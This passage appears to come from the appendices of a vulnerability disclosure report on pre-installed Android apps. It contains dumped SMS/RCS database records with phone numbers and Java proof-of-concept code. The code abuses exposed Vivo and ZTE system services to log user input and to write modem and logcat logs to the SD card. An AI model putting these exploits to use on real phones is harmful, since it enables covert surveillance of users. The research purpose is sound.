rcs_file_record:null rcs_chat_type:null rcs_disposition_type:null rcs_extend_body:null 
rcs_file_status:null rcs_thumb_status:null 
 _id:6 thread_id:4 address:(703) 671-7890 person:null date:1519962780392 date_sent:0 
protocol:null read:1 status:-1 type:2 reply_path_present:null subject:null body:korax 
service_center:null locked:0 sub_id:1 error_code:0 creator:com.android.mms seen:1 priority:-1 
phone_id:-1 rcs_message_id:null rcs_file_name:null rcs_mime_type:null rcs_msg_type:-1 
rcs_msg_state:null rcs_conversation_id:null rcs_contribution_id:null rcs_file_selector:null 
rcs_file_transfered:null rcs_file_transfer_id:null rcs_file_size:0 rcs_thumb_path:null 
rcs_read_status:|| rcs_file_icon:null rcs_extra_type:null rcs_file_record:null 
rcs_chat_type:null rcs_disposition_type:null rcs_extend_body:null rcs_file_status:null 
rcs_thumb_status:null 
10505 Judicial Drive, Suite 201 | Fairfax, VA 22030 | V: 703.352.2982 | F: 203.286.2533 | PI:EMAIL 
 _id:5 thread_id:4 address:+17036717890 person:null date:1519959534085 date_sent:0 
protocol:null read:1 status:-1 type:2 reply_path_present:null subject:null body:what 
the?!?!?!?!? service_center:null locked:0 sub_id:-1 error_code:0 creator:com.rcs.gsma.na.sdk 
seen:1 priority:-1 phone_id:-1 rcs_message_id:151995953409400001 rcs_file_name:null 
rcs_mime_type:null rcs_msg_type:0 rcs_msg_state:32 rcs_conversation_id:34db30f7-9327-40ec-
85cd-16693579cc71 rcs_contribution_id:2763cb38-5fa2-4fd4-ab10-fea00688c6ba 
rcs_file_selector:null rcs_file_transfered:0 rcs_file_transfer_id:null rcs_file_size:0 
rcs_thumb_path:null rcs_read_status:|| rcs_file_icon:null rcs_extra_type:0 rcs_file_record:0 
rcs_chat_type:1 rcs_disposition_type:0 rcs_extend_body:null rcs_file_status:0 
rcs_thumb_status:0 
 _id:4 thread_id:5 address:456 person:null date:1519958756064 date_sent:1519958754000 
protocol:0 read:1 status:-1 type:1 reply_path_present:0 subject:null body:T-Mobile allows you 
to purchase services from third parties and makes it easy to identify those charges to your 
account. You can also block purchases from third parties; visit t-mo.co/block to learn more. 
service_center:+14054720056 locked:0 sub_id:1 error_code:0 creator:com.android.mms seen:1 
priority:-1 phone_id:-1 rcs_message_id:null rcs_file_name:null rcs_mime_type:null 
rcs_msg_type:-1 rcs_msg_state:null rcs_conversation_id:null rcs_contribution_id:null 
rcs_file_selector:null rcs_file_transfered:null rcs_file_transfer_id:null rcs_file_size:0 
rcs_thumb_path:null rcs_read_status:|| rcs_file_icon:null rcs_extra_type:null 
rcs_file_record:null rcs_chat_type:null rcs_disposition_type:null rcs_extend_body:null 
rcs_file_status:null rcs_thumb_status:null 
 _id:3 thread_id:4 address:+17036717890 person:null date:1519953491939 date_sent:1519953492000 
protocol:0 read:1 status:-1 type:1 reply_path_present:0 subject:null body:Test 
service_center:+12063130056 locked:0 sub_id:1 error_code:0 creator:com.android.mms seen:1 
priority:-1 phone_id:-1 rcs_message_id:null rcs_file_name:null rcs_mime_type:null 
rcs_msg_type:-1 rcs_msg_state:null rcs_conversation_id:null rcs_contribution_id:null 
rcs_file_selector:null rcs_file_transfered:null rcs_file_transfer_id:null rcs_file_size:0 
rcs_thumb_path:null rcs_read_status:|| rcs_file_icon:null rcs_extra_type:null 
rcs_file_record:null rcs_chat_type:null rcs_disposition_type:null rcs_extend_body:null 
rcs_file_status:null rcs_thumb_status:null 
 _id:2 thread_id:4 address:(703) 671-7890 person:null date:1519953411079 date_sent:0 
protocol:null read:1 status:-1 type:2 reply_path_present:null subject:null body:Test 
service_center:null locked:0 sub_id:1 error_code:0 creator:com.android.mms seen:1 priority:-1 
phone_id:-1 rcs_message_id:null rcs_file_name:null rcs_mime_type:null rcs_msg_type:-1 
rcs_msg_state:null rcs_conversation_id:null rcs_contribution_id:null rcs_file_selector:null 
rcs_file_transfered:null rcs_file_transfer_id:null rcs_file_size:0 rcs_thumb_path:null 
rcs_read_status:|| rcs_file_icon:null rcs_extra_type:null rcs_file_record:null 
rcs_chat_type:null rcs_disposition_type:null rcs_extend_body:null rcs_file_status:null 
rcs_thumb_status:null 
 _id:1 thread_id:1 address:2941 person:null date:1519953278426 date_sent:1519953238000 
protocol:0 read:1 status:-1 type:1 reply_path_present:0 subject:null body:Welcome to T-Mobile! 
Dial #BAL# to check your balances. Your T-Mobile number is 17036348111 
service_center:+12063130056 locked:0 sub_id:1 error_code:0 creator:com.android.mms seen:1 
priority:-1 phone_id:-1 rcs_message_id:null rcs_file_name:null rcs_mime_type:null 
rcs_msg_type:-1 rcs_msg_state:null rcs_conversation_id:null rcs_contribution_id:null 
rcs_file_selector:null rcs_file_transfered:null rcs_file_transfer_id:null rcs_file_size:0 
rcs_thumb_path:null rcs_read_status:|| rcs_file_icon:null rcs_extra_type:null 
rcs_file_record:null rcs_chat_type:null rcs_disposition_type:null rcs_extend_body:null 
rcs_file_status:null rcs_thumb_status:null 
Appendix E. The output of querying the com.rcs.gsma.na.provider.capability authority of the 
com.rcs.gsma.na.provider.capability.CapabilityProvider class. 
 _id:1 contact:+17035307980 date:1520039661214 caps:0 uri:sip:+PI:EMAIL 
 _id:2 contact:+17036717890 date:1520889512809 caps:0 uri: 
 _id:3 contact:+15403464546 date:1520889269698 caps:0 uri: 
 _id:4 contact:+15403464546 date:1520889269698 caps:0 uri: 
 _id:5 contact:+17064546454 date:1520889269755 caps:0 uri: 
10505 Judicial Drive, Suite 201 | Fairfax, VA 22030 | V: 703.352.2982 | F: 203.286.2533 | PI:EMAIL 
Appendix F. The AndroidManifest.xml file of the com.qualcomm.qti.modemtestmode app 
(versionCode=25, versionName=7.1.2) from the Vivo V7 Android Device. 
Appendix G. Obtaining User Input on the Vivo V7 via Setting a System Property. 
public void vivo_v7_set_properties_as_phone() { 
    Intent i = new Intent(); 
    i.setClassName("com.qualcomm.qti.modemtestmode", 
"com.qualcomm.qti.modemtestmode.MbnTestService"); 
    VivoServiceConnection servConn = new VivoServiceConnection(); 
    boolean ret = bindService(i, servConn, BIND_AUTO_CREATE); 
    Log.d(TAG, "initService() bound with " + ret); 
} 
class VivoServiceConnection implements ServiceConnection { 
    public void onServiceConnected(ComponentName name, IBinder boundService) { 
10505 Judicial Drive, Suite 201 | Fairfax, VA 22030 | V: 703.352.2982 | F: 203.286.2533 | PI:EMAIL 
        Log.w(TAG, "onServiceConnected"); 
        Class clazz = boundService.getClass(); 
        Parcel data = Parcel.obtain(); 
        data.writeInterfaceToken("com.qualcomm.qti.modemtestmode.f"); 
        data.writeString("persist.sys.input.log"); 
        data.writeString("yes"); 
        Parcel reply = Parcel.obtain(); 
        try { 
            boundService.transact(1, data, reply, 0); 
        } catch (RemoteException e) { 
            e.printStackTrace(); 
        } 
    } 
    @Override 
    public void onServiceDisconnected(ComponentName arg0) {} 
} 
Appendix H. PoC Code for Obtaining the Modem Logs. 
Below is the source code to initiate the writing of the modem logs to the SD card. After executing this 
code, a directory with a path of /sdcard/sd_logs will appear. After around 20 seconds, a binary file will 
appear in this directory. An example file name is sdlog_13_12_44_21.qmdl.gz. The file needs to be 
decompressed with gunzip first. Then the file can be parsed for telephony data matching specific formats 
or input into a program that views or converts the qmdl file. The code below needs to be inserted into an 
Android app on a ZTE device. In addition, the device should have a SIM card inserted.  
public void zte_enable_and_start_modem_logs() throws Exception { 
    Class servman = Class.forName("android.os.ServiceManager"); 
    Method getServ = servman.getDeclaredMethod("getIServiceManager", new Class[0]); 
    getServ.setAccessible(true); 
    Object obj = getServ.invoke(null, new Object[0]); 
    Class iServiceManager = obj.getClass(); 
    Method[] iSM = iServiceManager.getDeclaredMethods(); 
    Method getService = iServiceManager.getDeclaredMethod("getService", new 
Class[]{String.class}); 
    getService.setAccessible(true); 
    String serviceName = "ModemService"; 
    IBinder modemServiceBinderyProxy = (IBinder) getService.invoke(obj, new Object[] 
{serviceName}); 
    Class modemServiceBinderyProxyClass = modemServiceBinderyProxy.getClass(); 
    Method[] mdBPmethd = modemServiceBinderyProxyClass.getDeclaredMethods(); 
    Parcel data = Parcel.obtain(); 
    data.writeInterfaceToken("com.android.modem.service.IModemService"); 
    Parcel reply = Parcel.obtain(); 
    modemServiceBinderyProxy.transact(1, data, reply, 0); // gets the ISdlogService 
    int check = reply.readInt(); 
    IBinder sdLogInterface = reply.readStrongBinder(); 
    data.recycle(); 
    reply.recycle(); 
    Parcel data1 = Parcel.obtain(); 
    Parcel reply1 = Parcel.obtain(); 
10505 Judicial Drive, Suite 201 | Fairfax, VA 22030 | V: 703.352.2982 | F: 203.286.2533 | PI:EMAIL 
    data1.writeInterfaceToken("com.android.modem.service.ISdlogService"); 
    sdLogInterface.transact(0x18, data1, reply1, 0); // configSdlog()Z 
    int replyint1 = reply1.readInt(); 
    data1.recycle(); 
    reply1.recycle(); 
    Parcel data2 = Parcel.obtain(); 
    Parcel reply2 = Parcel.obtain(); 
    data2.writeInterfaceToken("com.android.modem.service.ISdlogService"); 
    sdLogInterface.transact(0x5, data2, reply2, 0); // enableLog()V 
    int replyint2 = reply2.readInt(); 
    data2.recycle(); 
    reply2.recycle(); 
    Parcel data3 = Parcel.obtain(); 
    Parcel reply3 = Parcel.obtain(); 
    data3.writeInterfaceToken("com.android.modem.service.ISdlogService"); 
    sdLogInterface.transact(0x2, data3, reply3, 0); // startLog()V 
    int replyint3 = reply3.readInt(); 
    data3.recycle(); 
    reply3.recycle(); 
} 
Appendix I. PoC Code for Obtaining the Logcat Logs. 
Below is the source code to initiate the writing of the logcat logs to the SD card. After executing this 
code, a directory with a path of /sdcard/sd_logs/AdbLog/logcat will be created. Then four files 
corresponding to the names of the logcat log buffers will start being written in the directory.  
public void zte_obtain_android_log() throws Exception { 
    Class servman = Class.forName("android.os.ServiceManager"); 
    Method getServ = servman.getDeclaredMethod("getIServiceManager", new Class[0]); 
    getServ.setAccessible(true); 
    Object obj = getServ.invoke(null, new Object[0]); 
    Class iServiceManager = obj.getClass(); 
    Method[] iSM = iServiceManager.getDeclaredMethods(); 
    Method getService = iServiceManager.getDeclaredMethod("getService", new 
Class[]{String.class}); 
    getService.setAccessible(true); 
    String serviceName = "ModemService"; 
    IBinder modemServiceBinderyProxy = (IBinder) getService.invoke(obj, new Object[] 
{serviceName}); 
    Class modemServiceBinderyProxyClass = modemServiceBinderyProxy.getClass(); 
    Method[] mdBPmethd = modemServiceBinderyProxyClass.getDeclaredMethods(); 
    Parcel data = Parcel.obtain(); 
    data.writeInterfaceToken("com.android.modem.service.IModemService"); 
10505 Judicial Drive, Suite 201 | Fairfax, VA 22030 | V: 703.352.2982 | F: 203.286.2533 | PI:EMAIL 
    Parcel reply = Parcel.obtain(); 
    modemServiceBinderyProxy.transact(2, data, reply, 0); // gets the IAssistantService 
    int check = reply.readInt(); 
    IBinder serviceInterface = reply.readStrongBinder(); 
    data.recycle(); 
    reply.recycle(); 
    Parcel data1 = Parcel.obtain(); 
    Parcel reply1 = Parcel.obtain(); 
    data1.writeInterfaceToken("com.android.modem.service.IAssistantService"); 
    data1.writeInt(1); 
    serviceInterface.transact(0x1, data1, reply1, 0); // enableDeamonProcess(Z)V 
    int replyint1 = reply.readInt(); 
    data1.recycle(); 
    reply1.recycle(); 
    Parcel data2 = Parcel.obtain(); 
    Parcel reply2 = Parcel.obtain(); 
    data2.writeInterfaceToken("com.android.modem.service.IAssistantService"); 
    data2.writeInt(1); 
    serviceInterface.transact(0x12, data2, reply2, 0); // enableAdbLog(Z)V 
    int replyint2 = reply2.readInt(); 
    data2.recycle(); 
    reply2.recycle(); 
}